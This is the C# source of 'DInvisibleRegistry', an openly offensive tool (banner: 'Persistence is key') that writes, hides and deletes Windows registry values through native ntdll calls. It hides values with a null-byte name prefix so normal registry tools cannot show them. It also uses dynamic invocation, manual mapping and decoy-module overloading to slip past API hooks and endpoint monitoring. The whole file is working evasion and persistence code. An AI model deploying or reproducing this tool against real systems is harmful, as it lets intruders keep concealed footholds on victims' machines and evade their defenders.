using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using NDesk.Options;


namespace DInvisibleRegistry
{
    class Program
    {


        public static void ShowHelp(OptionSet p)
        {
            Console.WriteLine(" Usage:");
            p.WriteOptionDescriptions(Console.Out);
        }


        public static void PrintBanner()
        {
            Console.WriteLine(@"");
            Console.WriteLine(@"");
            Console.WriteLine(@"$$$$$$$\  $$\                     $$\           $$\ $$\       $$\           $$$$$$$\                      $$\             $$\                         ");
            Console.WriteLine(@"$$  __$$\ \__|                    \__|          \__|$$ |      $$ |          $$  __$$\                     \__|            $$ |                        ");
            Console.WriteLine(@"$$ |  $$ |$$\ $$$$$$$\ $$\    $$\ $$\  $$$$$$$\ $$\ $$$$$$$\  $$ | $$$$$$\  $$ |  $$ | $$$$$$\   $$$$$$\  $$\  $$$$$$$\ $$$$$$\    $$$$$$\  $$\   $$\ ");
            Console.WriteLine(@"$$ |  $$ |$$ |$$  __$$\\$$\  $$  |$$ |$$  _____|$$ |$$  __$$\ $$ |$$  __$$\ $$$$$$$  |$$  __$$\ $$  __$$\ $$ |$$  _____|\_$$  _|  $$  __$$\ $$ |  $$ |");
            Console.WriteLine(@"$$ |  $$ |$$ |$$ |  $$ |\$$\$$  / $$ |\$$$$$$\  $$ |$$ |  $$ |$$ |$$$$$$$$ |$$  __$$< $$$$$$$$ |$$ /  $$ |$$ |\$$$$$$\    $$ |    $$ |  \__|$$ |  $$ |");
            Console.WriteLine(@"$$ |  $$ |$$ |$$ |  $$ | \$$$  /  $$ | \____$$\ $$ |$$ |  $$ |$$ |$$   ____|$$ |  $$ |$$   ____|$$ |  $$ |$$ | \____$$\   $$ |$$\ $$ |      $$ |  $$ |");
            Console.WriteLine(@"$$$$$$$  |$$ |$$ |  $$ |  \$  /   $$ |$$$$$$$  |$$ |$$$$$$$  |$$ |\$$$$$$$\ $$ |  $$ |\$$$$$$$\ \$$$$$$$ |$$ |$$$$$$$  |  \$$$$  |$$ |      \$$$$$$$ |");
            Console.WriteLine(@"\_______/ \__|\__|  \__|   \_/    \__|\_______/ \__|\_______/ \__| \_______|\__|  \__| \_______| \____$$ |\__|\_______/    \____/ \__|       \____$$ |");
            Console.WriteLine(@"                                                                                                $$\   $$ |                                  $$\   $$ |");
            Console.WriteLine(@"                                                                                                \$$$$$$  |                                  \$$$$$$  |");
            Console.WriteLine(@"                                                                                                 \______/                                    \______/ ");
            Console.WriteLine(@"");
            Console.WriteLine(@"");
            Console.WriteLine("Old meets new... Persistence is key....");
            Console.WriteLine(@"");
            Console.WriteLine("Developed by @jean_maes_1994\n\n\n");
        }

        public static void DRegHide(String hive = "HKCU", String subKey = @"\SOFTWARE", String keyName = "", String keyValue = "", bool hiddenKey = false, bool deleteKey = false)
        {
            try
            {
                if (hive == "HKLM")
                {
                    hive = @"\Registry\Machine";
                }
                else if (hive == "HKCU")
                {
                    String sid = WindowsIdentity.GetCurrent().User.ToString();
                    hive = @"\Registry\User\" + sid;
                }
                else
                {
                    throw new Exception("Hive needs to be either HKLM or HKCU");
                }
                if (hiddenKey)
                {
                    keyName = "\0" + keyName;
                }
                String regKey = hive + subKey;
                IntPtr keyHandle = IntPtr.Zero;
                STRUCTS.OBJECT_ATTRIBUTES oa = new STRUCTS.OBJECT_ATTRIBUTES();
                DInvoke.Data.Native.UNICODE_STRING UC_RegKey = new DInvoke.Data.Native.UNICODE_STRING();
                string SID = WindowsIdentity.GetCurrent().User.ToString();
                DInvoke.DynamicInvoke.Native.RtlInitUnicodeString(ref UC_RegKey, regKey);
                IntPtr oaObjectName = Marshal.AllocHGlobal(Marshal.SizeOf(UC_RegKey));
                Marshal.StructureToPtr(UC_RegKey, oaObjectName, true);
                oa.Length = Marshal.SizeOf(oa);
                oa.Attributes = (uint)STRUCTS.OBJ_ATTRIBUTES.CASE_INSENSITIVE;
                oa.objectName = oaObjectName;
                oa.SecurityDescriptor = IntPtr.Zero;
                oa.SecurityQualityOfService = IntPtr.Zero;
                DInvoke.Data.Native.NTSTATUS retValue = new DInvoke.Data.Native.NTSTATUS();

                retValue = TinyDinvoke.NtOpenKey(ref keyHandle, STRUCTS.ACCESS_MASK.KEY_ALL_ACCESS, ref oa);
                if (retValue == DInvoke.Data.Native.NTSTATUS.Success)
                {
                    Console.WriteLine("Handle to " + hive + " succesfully opened!");
                    String keyValueName = keyName;
                    String keyValueData = keyValue;
                    DInvoke.Data.Native.UNICODE_STRING UC_RegKeyValueName = new DInvoke.Data.Native.UNICODE_STRING();
                    DInvoke.Data.Native.UNICODE_STRING UC_RegKeyValueData = new DInvoke.Data.Native.UNICODE_STRING();
                    if (!hiddenKey)
                    {
                        DInvoke.DynamicInvoke.Native.RtlInitUnicodeString(ref UC_RegKeyValueName, keyValueName);
                    }
                    else
                    {
                        UC_RegKeyValueName.Length = (ushort)(keyValueName.Length * 2);
                        UC_RegKeyValueName.MaximumLength = (ushort)(keyValueName.Length * 2);
                        UC_RegKeyValueName.Buffer = Marshal.StringToCoTaskMemUni(keyValueName);
                    }
                    DInvoke.DynamicInvoke.Native.RtlInitUnicodeString(ref UC_RegKeyValueData, keyValueData);
                    if (!deleteKey)
                    {
                        retValue = TinyDinvoke.NtSetValueKey(keyHandle, ref UC_RegKeyValueName, 0, STRUCTS.REGISTRY_TYPES.REG_SZ, UC_RegKeyValueData.Buffer, UC_RegKeyValueData.Length);
                        if (retValue == DInvoke.Data.Native.NTSTATUS.Success)
                        {
                            Console.WriteLine("RegKey successfully set");
                        }
                    }
                    else
                    {
                        retValue = TinyDinvoke.NtDeleteValueKey(keyHandle, ref UC_RegKeyValueName);
                        Console.WriteLine("key deletion status: " + retValue);
                    }
                    Marshal.FreeHGlobal(oa.objectName);
                    TinyDinvoke.NtClose(keyHandle);
                }
                else { Console.WriteLine("Regkey not found"); }


            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }


        }

        public static void DRegHideManualMap(String hive = "HKCU", String subKey = @"\SOFTWARE", String keyName = "", String keyValue = "", bool hiddenKey = false, bool deleteKey = false)
        {
            DInvoke.Data.PE.PE_MANUAL_MAP mappedDLL = new DInvoke.Data.PE.PE_MANUAL_MAP();
            mappedDLL = DInvoke.ManualMap.Map.MapModuleToMemory(@"C:\Windows\System32\ntdll.dll");

            try
            {
                if (hive == "HKLM")
                {
                    hive = @"\Registry\Machine";
                }
                else if (hive == "HKCU")
                {
                    String sid = WindowsIdentity.GetCurrent().User.ToString();
                    hive = @"\Registry\User\" + sid;
                }
                else
                {
                    throw new Exception("Hive needs to be either HKLM or HKCU");
                }
                if (hiddenKey)
                {
                    keyName = "\0" + keyName;
                }
                String regKey = hive + subKey;
                IntPtr keyHandle = IntPtr.Zero;
                STRUCTS.OBJECT_ATTRIBUTES oa = new STRUCTS.OBJECT_ATTRIBUTES();
                DInvoke.Data.Native.UNICODE_STRING UC_RegKey = new DInvoke.Data.Native.UNICODE_STRING();
                string SID = WindowsIdentity.GetCurrent().User.ToString();
                DInvoke.DynamicInvoke.Native.RtlInitUnicodeString(ref UC_RegKey, regKey);
                IntPtr oaObjectName = Marshal.AllocHGlobal(Marshal.SizeOf(UC_RegKey));
                Marshal.StructureToPtr(UC_RegKey, oaObjectName, true);
                oa.Length = Marshal.SizeOf(oa);
                oa.Attributes = (uint)STRUCTS.OBJ_ATTRIBUTES.CASE_INSENSITIVE;
                oa.objectName = oaObjectName;
                oa.SecurityDescriptor = IntPtr.Zero;
                oa.SecurityQualityOfService = IntPtr.Zero;
                DInvoke.Data.Native.NTSTATUS retValue = new DInvoke.Data.Native.NTSTATUS();

                ref IntPtr rkeyHandle = ref keyHandle;
                STRUCTS.ACCESS_MASK desiredAccess = STRUCTS.ACCESS_MASK.KEY_ALL_ACCESS;
                ref STRUCTS.OBJECT_ATTRIBUTES roa = ref oa;
                object[] ntOpenKeyParams =
                {
                   rkeyHandle,desiredAccess,roa
                };



                retValue = (DInvoke.Data.Native.NTSTATUS)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "NtOpenKey", typeof(DELEGATES.NtOpenKey), ntOpenKeyParams, false);
                keyHandle = (IntPtr)ntOpenKeyParams[0];

                if (retValue == DInvoke.Data.Native.NTSTATUS.Success)
                {
                    Console.WriteLine("Handle to " + hive + " succesfully opened!");
                    String keyValueName = keyName;
                    String keyValueData = keyValue;
                    DInvoke.Data.Native.UNICODE_STRING UC_RegKeyValueName = new DInvoke.Data.Native.UNICODE_STRING();
                    DInvoke.Data.Native.UNICODE_STRING UC_RegKeyValueData = new DInvoke.Data.Native.UNICODE_STRING();
                    if (!hiddenKey)
                    {
                        DInvoke.DynamicInvoke.Native.RtlInitUnicodeString(ref UC_RegKeyValueName, keyValueName);
                    }
                    else
                    {
                        UC_RegKeyValueName.Length = (ushort)(keyValueName.Length * 2);
                        UC_RegKeyValueName.MaximumLength = (ushort)(keyValueName.Length * 2);
                        UC_RegKeyValueName.Buffer = Marshal.StringToCoTaskMemUni(keyValueName);
                    }
                    DInvoke.DynamicInvoke.Native.RtlInitUnicodeString(ref UC_RegKeyValueData, keyValueData);

                    object[] ntSetValueKeyParams =
                    {
                      keyHandle, UC_RegKeyValueName, 0, STRUCTS.REGISTRY_TYPES.REG_SZ, UC_RegKeyValueData.Buffer, UC_RegKeyValueData.Length
                    };

                    if (!deleteKey)
                    {
                        retValue = (DInvoke.Data.Native.NTSTATUS)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "NtSetValueKey", typeof(DELEGATES.NtSetValueKey), ntSetValueKeyParams, false);
                        if (retValue == DInvoke.Data.Native.NTSTATUS.Success)
                        {
                            Console.WriteLine("RegKey successfully set");
                        }
                    }
                    else
                    {
                        object[] NtDeleteValueKeyParams =
                        {
                            keyHandle,UC_RegKeyValueName
                        };

                        retValue = (DInvoke.Data.Native.NTSTATUS)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "NtDeleteValueKey", typeof(DELEGATES.NtDeleteValueKey), NtDeleteValueKeyParams, false);
                        Console.WriteLine("key deletion status: " + retValue);
                    }
                    Marshal.FreeHGlobal(oa.objectName);
                    object[] ntCloseParams = { keyHandle };

                    retValue = (DInvoke.Data.Native.NTSTATUS)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "NtClose", typeof(DELEGATES.NtClose), ntCloseParams, false);
                }
                else { Console.WriteLine("Regkey not found"); }


            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

        }

        public static void DRegHideWithDeception(String hive = "HKCU", String subKey = @"\SOFTWARE", String keyName = "", String keyValue = "", bool hiddenKey = false, bool deleteKey = false)
        {
            DInvoke.Data.PE.PE_MANUAL_MAP mappedDLL = DInvoke.ManualMap.Overload.OverloadModule(@"C:\Windows\System32\ntdll.dll");
            Console.WriteLine("Decoy module is found!\n Using: {0} as a decoy", mappedDLL.DecoyModule);

            try
            {
                if (hive == "HKLM")
                {
                    hive = @"\Registry\Machine";
                }
                else if (hive == "HKCU")
                {
                    String sid = WindowsIdentity.GetCurrent().User.ToString();
                    hive = @"\Registry\User\" + sid;
                }
                else
                {
                    throw new Exception("Hive needs to be either HKLM or HKCU");
                }
                if (hiddenKey)
                {
                    keyName = "\0" + keyName;
                }
                String regKey = hive + subKey;
                IntPtr keyHandle = IntPtr.Zero;
                STRUCTS.OBJECT_ATTRIBUTES oa = new STRUCTS.OBJECT_ATTRIBUTES();
                DInvoke.Data.Native.UNICODE_STRING UC_RegKey = new DInvoke.Data.Native.UNICODE_STRING();
                string SID = WindowsIdentity.GetCurrent().User.ToString();
                DInvoke.DynamicInvoke.Native.RtlInitUnicodeString(ref UC_RegKey, regKey);
                IntPtr oaObjectName = Marshal.AllocHGlobal(Marshal.SizeOf(UC_RegKey));
                Marshal.StructureToPtr(UC_RegKey, oaObjectName, true);
                oa.Length = Marshal.SizeOf(oa);
                oa.Attributes = (uint)STRUCTS.OBJ_ATTRIBUTES.CASE_INSENSITIVE;
                oa.objectName = oaObjectName;
                oa.SecurityDescriptor = IntPtr.Zero;
                oa.SecurityQualityOfService = IntPtr.Zero;
                DInvoke.Data.Native.NTSTATUS retValue = new DInvoke.Data.Native.NTSTATUS();

                object[] ntOpenKeyParams =
                {
                   keyHandle,STRUCTS.ACCESS_MASK.KEY_ALL_ACCESS,oa
                };


                retValue = (DInvoke.Data.Native.NTSTATUS)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "NtOpenKey", typeof(DELEGATES.NtOpenKey), ntOpenKeyParams, false);
                keyHandle = (IntPtr)ntOpenKeyParams[0];

                if (retValue == DInvoke.Data.Native.NTSTATUS.Success)
                {
                    Console.WriteLine("Handle to " + hive + " succesfully opened!");
                    String keyValueName = keyName;
                    String keyValueData = keyValue;
                    DInvoke.Data.Native.UNICODE_STRING UC_RegKeyValueName = new DInvoke.Data.Native.UNICODE_STRING();
                    DInvoke.Data.Native.UNICODE_STRING UC_RegKeyValueData = new DInvoke.Data.Native.UNICODE_STRING();
                    if (!hiddenKey)
                    {
                        DInvoke.DynamicInvoke.Native.RtlInitUnicodeString(ref UC_RegKeyValueName, keyValueName);
                    }
                    else
                    {
                        UC_RegKeyValueName.Length = (ushort)(keyValueName.Length * 2);
                        UC_RegKeyValueName.MaximumLength = (ushort)(keyValueName.Length * 2);
                        UC_RegKeyValueName.Buffer = Marshal.StringToCoTaskMemUni(keyValueName);
                    }
                    DInvoke.DynamicInvoke.Native.RtlInitUnicodeString(ref UC_RegKeyValueData, keyValueData);

                    object[] ntSetValueKeyParams =
                    {
                      keyHandle, UC_RegKeyValueName, 0, STRUCTS.REGISTRY_TYPES.REG_SZ, UC_RegKeyValueData.Buffer, UC_RegKeyValueData.Length
                    };

                    if (!deleteKey)
                    {
                        retValue = (DInvoke.Data.Native.NTSTATUS)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "NtSetValueKey", typeof(DELEGATES.NtSetValueKey), ntSetValueKeyParams, false);
                        if (retValue == DInvoke.Data.Native.NTSTATUS.Success)
                        {
                            Console.WriteLine("RegKey successfully set");
                        }
                    }
                    else
                    {
                        object[] NtDeleteValueKeyParams =
                        {
                            keyHandle,UC_RegKeyValueName
                        };

                        retValue = (DInvoke.Data.Native.NTSTATUS)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "NtDeleteValueKey", typeof(DELEGATES.NtDeleteValueKey), NtDeleteValueKeyParams, false);
                        Console.WriteLine("key deletion status: " + retValue);
                    }
                    Marshal.FreeHGlobal(oa.objectName);
                    object[] ntCloseParams = { keyHandle };

                    retValue = (DInvoke.Data.Native.NTSTATUS)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "NtClose", typeof(DELEGATES.NtClose), ntCloseParams, false);
                }
                else { Console.WriteLine("Regkey not found"); }


            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        static void Main(string[] args)
        {
            bool help = false;
            bool deleteRegKey = false;
            bool normal = false;
            bool manualmap = false;
            bool deception = false;
            String regHive = "";
            String regSubTree = "";
            String regKeyName = "";
            String regKeyValue = "";
            bool hideRegKey = false;

            var options = new OptionSet()
                {
                { "n|normal","Uses the regular DInvoke method\n", o => normal = true},
                { "m|manual|manual-map","Uses the manualmap method\n", o => manualmap = true},
                { "o|deception","uses the overload method for deception\n", o => deception = true},
                { "?|help","Show Help\n", o => help = true },
                {"h|reg-hide","hide the registry key using null byte magic\n", o => hideRegKey = true },
                {"d|del|delreg","deletes given regkey\n", o => deleteRegKey = true },
                {"rh|reg-hive=","the registry hive you want to add a key to (HKLM/HKCU)\n",o=> regHive = o },
                {"rs|reg-sub=", "the subtree you want to open a handle to needs to start with a \\ ex. \\SOFTWARE \n", o => regSubTree = @o },
                {"rk|reg-key=","the name of the registry key you want to write\n",o=>regKeyName= o },
                {"rv|rkv|reg-value=","the value of the registry key you want to write\n", o=>regKeyValue = @o },

                };

            PrintBanner();
            options.Parse(args);

            if (help)
            {
                ShowHelp(options);
                return;
            }

            try
            {
                if (normal)
                { DRegHide(regHive, regSubTree, regKeyName, regKeyValue, hideRegKey, deleteRegKey); }
                else if (manualmap)
                { DRegHideManualMap(regHive, regSubTree, regKeyName, regKeyValue, hideRegKey, deleteRegKey); }
                else if (deception)
                { DRegHideWithDeception(regHive, regSubTree, regKeyName, regKeyValue, hideRegKey, deleteRegKey); }
                else
                { throw new ArgumentException("You got to specify a method with -n -m or -o"); }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                ShowHelp(options);
                return;
            }

        }


        /*
         * these invocations will be included in the next major release of Dinvoke
         */
        public class TinyDinvoke
        {
            public static DInvoke.Data.Native.NTSTATUS NtOpenKey(
               ref IntPtr keyHandle,
               STRUCTS.ACCESS_MASK desiredAccess,
               ref STRUCTS.OBJECT_ATTRIBUTES objectAttributes)
            {
                object[] funcargs =
                {
                keyHandle,desiredAccess,objectAttributes
            };
                DInvoke.Data.Native.NTSTATUS retvalue = (DInvoke.Data.Native.NTSTATUS)DInvoke.DynamicInvoke.Generic.DynamicAPIInvoke(@"ntdll.dll", @"NtOpenKey", typeof(DELEGATES.NtOpenKey), ref funcargs);
                keyHandle = (IntPtr)funcargs[0];
                return retvalue;
            }


            public static DInvoke.Data.Native.NTSTATUS NtSetValueKey(IntPtr keyHandle, ref DInvoke.Data.Native.UNICODE_STRING valueName, int titleIndex, STRUCTS.REGISTRY_TYPES type, IntPtr data, int dataSize)
            {
                object[] funcargs =
                {
                keyHandle,valueName,titleIndex,type,data,dataSize
            };
                DInvoke.Data.Native.NTSTATUS retvalue = (DInvoke.Data.Native.NTSTATUS)DInvoke.DynamicInvoke.Generic.DynamicAPIInvoke(@"ntdll.dll", @"NtSetValueKey", typeof(DELEGATES.NtSetValueKey), ref funcargs);
                return retvalue;
            }

            public static DInvoke.Data.Native.NTSTATUS NtDeleteValueKey(IntPtr keyHandle, ref DInvoke.Data.Native.UNICODE_STRING valueName)
            {
                object[] funcargs =
                {
               keyHandle,valueName
            };
                DInvoke.Data.Native.NTSTATUS retvalue = (DInvoke.Data.Native.NTSTATUS)DInvoke.DynamicInvoke.Generic.DynamicAPIInvoke(@"ntdll.dll", @"NtDeleteValueKey", typeof(DELEGATES.NtDeleteValueKey), ref funcargs);
                return retvalue;
            }


            public static DInvoke.Data.Native.NTSTATUS NtClose(IntPtr handle)
            {
                object[] funcargs = { handle };
                DInvoke.Data.Native.NTSTATUS retvalue = (DInvoke.Data.Native.NTSTATUS)DInvoke.DynamicInvoke.Generic.DynamicAPIInvoke(@"ntdll.dll", @"NtClose", typeof(DELEGATES.NtClose), ref funcargs);
                return retvalue;
            }
        }

        /*
         * These Delegates will be included in the next major release of Dinvoke
         */
        public class DELEGATES
        {
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate DInvoke.Data.Native.NTSTATUS NtOpenKey(
                 ref IntPtr keyHandle,
                 STRUCTS.ACCESS_MASK desiredAccess,
                 ref STRUCTS.OBJECT_ATTRIBUTES objectAttributes);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate DInvoke.Data.Native.NTSTATUS NtSetValueKey(
                IntPtr keyHandle, ref DInvoke.Data.Native.UNICODE_STRING valueName, int titleIndex, STRUCTS.REGISTRY_TYPES type, IntPtr Data, int DataSize);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate DInvoke.Data.Native.NTSTATUS NtDeleteValueKey(IntPtr keyHandle, ref DInvoke.Data.Native.UNICODE_STRING valueName);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate DInvoke.Data.Native.NTSTATUS NtClose(IntPtr keyHandle);
        }

        /*
         * These structs will be included in the next major release of Dinvoke
         */
        public class STRUCTS
        {
            [StructLayout(LayoutKind.Sequential)]
            public struct OBJECT_ATTRIBUTES
            {
                public int Length;
                public IntPtr RootDirectory;
                public IntPtr objectName;
                public uint Attributes;
                public IntPtr SecurityDescriptor;
                public IntPtr SecurityQualityOfService;
            }

            public enum REGISTRY_TYPES : uint
            {
                REG_NONE = 0x00000000,
                REG_SZ = 0x00000001,
                REG_EXPAND_SZ = 0x00000002,
                REG_BINARY = 0x00000003,
                REG_DWORD = 0x00000004,
                REG_DWORD_LITTLE_ENDIAN = 0x00000004,
                REG_DWORD_BIG_ENDIAN = 0x00000005,
                REG_LINK = 0x00000006,
                REG_MULTI_SZ = 0x00000007,
                REG_RESOURCE_LIST = 0x00000008,
                REG_QWORD = 0x0000000B,
                REG_QWORD_LITTLE_ENDIAN = 0x0000000B


            }

            [Flags]
            public enum OBJ_ATTRIBUTES : uint
            {

                INHERIT = 0x00000002,
                PERMANENT = 0x00000010,
                EXCLUSIVE = 0x00000020,
                CASE_INSENSITIVE = 0x00000040,
                OPENIF = 0x00000080,
                OPENLINK = 0x00000100,
                KERNEL_HANDLE = 0x00000200,
                FORCE_ACCESS_CHECK = 0x00000400,
            }


            [Flags]
            public enum ACCESS_MASK : uint
            {
                DELETE = 0x00010000,
                READ_CONTROL = 0x00020000,
                WRITE_DAC = 0x00040000,
                WRITE_OWNER = 0x00080000,
                SYNCHRONIZE = 0x00100000,
                STANDARD_RIGHTS_REQUIRED = 0x000F0000,
                STANDARD_RIGHTS_READ = 0x00020000,
                STANDARD_RIGHTS_WRITE = 0x00020000,
                STANDARD_RIGHTS_EXECUTE = 0x00020000,
                STANDARD_RIGHTS_ALL = 0x001F0000,
                SPECIFIC_RIGHTS_ALL = 0x0000FFF,
                ACCESS_SYSTEM_SECURITY = 0x01000000,
                MAXIMUM_ALLOWED = 0x02000000,
                GENERIC_READ = 0x80000000,
                GENERIC_WRITE = 0x40000000,
                GENERIC_EXECUTE = 0x20000000,
                GENERIC_ALL = 0x10000000,
                DESKTOP_READOBJECTS = 0x00000001,
                DESKTOP_CREATEWINDOW = 0x00000002,
                DESKTOP_CREATEMENU = 0x00000004,
                DESKTOP_HOOKCONTROL = 0x00000008,
                DESKTOP_JOURNALRECORD = 0x00000010,
                DESKTOP_JOURNALPLAYBACK = 0x00000020,
                DESKTOP_ENUMERATE = 0x00000040,
                DESKTOP_WRITEOBJECTS = 0x00000080,
                DESKTOP_SWITCHDESKTOP = 0x00000100,
                WINSTA_ENUMDESKTOPS = 0x00000001,
                WINSTA_READATTRIBUTES = 0x00000002,
                WINSTA_ACCESSCLIPBOARD = 0x00000004,
                WINSTA_CREATEDESKTOP = 0x00000008,
                WINSTA_WRITEATTRIBUTES = 0x00000010,
                WINSTA_ACCESSGLOBALATOMS = 0x00000020,
                WINSTA_EXITWINDOWS = 0x00000040,
                WINSTA_ENUMERATE = 0x00000100,
                WINSTA_READSCREEN = 0x00000200,
                WINSTA_ALL_ACCESS = 0x0000037F,

                SECTION_ALL_ACCESS = 0x10000000,
                SECTION_QUERY = 0x0001,
                SECTION_MAP_WRITE = 0x0002,
                SECTION_MAP_READ = 0x0004,
                SECTION_MAP_EXECUTE = 0x0008,
                SECTION_EXTEND_SIZE = 0x0010,

                //expanded for registry alterations https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights
                KEY_ALL_ACCESS = 0xF003F,
                KEY_CREATE_LINK = 0x0020,
                KEY_CREATE_SUB_KEY = 0x0004,
                KEY_ENUMERATE_SUB_KEYS = 0x0008,
                KEY_EXECUTE = 0x20019,
                KEY_NOTIFY = 0x0010,
                KEY_QUERY_VALUE = 0x0001,
                KEY_READ = 0x20019,
                KEY_SET_VALUE = 0x0002,
                KEY_WOW64_32KEY = 0x0200,
                KEY_WOW64_64KEY = 0x0100,
                KEY_WRITE = 0x20006,

            }


        }

    }
}
